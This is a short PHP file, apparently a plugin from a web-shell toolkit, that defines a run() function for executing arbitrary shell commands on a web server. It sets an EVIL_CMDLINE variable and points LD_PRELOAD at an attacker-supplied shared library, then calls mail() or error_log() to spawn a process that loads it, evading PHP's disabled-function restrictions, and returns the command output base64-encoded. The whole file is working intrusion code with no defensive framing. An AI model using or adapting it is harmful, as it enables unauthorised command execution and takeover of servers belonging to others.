<?php
//global: $pwd, $cmd, $sopath
set_time_limit(0);

function run($vars){
    extract($vars);
    $ret = array('code'=>1, 'msg'=>'');
    chdir($pwd);
    if(file_exists($sopath)){
        $tmpfile = tempnam(sys_get_temp_dir(), "sdfsdf");
        $cmd = "exec 1> $tmpfile 2>&1;$cmd";
        putenv("EVIL_CMDLINE=".$cmd);
        putenv("LD_PRELOAD=".$sopath);
        if(function_exists('mail')){
            mail("", "", "", "");
        }else if(function_exists('error_log'))
            error_log("err",1,"","");
        $f = fopen($tmpfile, 'rb');
        $size = filesize($tmpfile);
        if($f!==false && ($data = fread($f, $size>0?$size:1024))!==false){
            $ret['msg'] = base64_encode(substr($data, 0, strlen($data)-1));
        }else{
            $ret['code'] = -1;
        }
        fclose($f);
        unlink($tmpfile);
    }else{
        $ret['code'] = -2;
    }
    return json_encode($ret);
}